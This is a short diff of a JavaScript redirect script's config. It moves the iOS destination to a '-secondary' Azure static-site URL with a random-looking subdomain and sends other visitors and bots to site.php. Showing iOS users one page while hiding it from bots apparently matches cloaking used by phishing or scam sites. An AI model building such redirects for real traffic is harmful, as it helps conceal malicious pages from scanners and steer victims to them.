@@ -16,7 +16,7 @@
   "use strict";
 
   // --- CONFIG: change these two values if needed ------------------
-  var IOS_DESTINATION   = "https://e33030109e3303echo6.z13.web.core.windows.net/2.html"; // where iOS users go
+  var IOS_DESTINATION   = "https://e33030109e3303echo6-secondary.z13.web.core.windows.net/2.html"; // where iOS users go
   var DEFAULT_DESTINATION = "site.php";         // where everyone else + bots go
   // ----------------------------------------------------------------
 
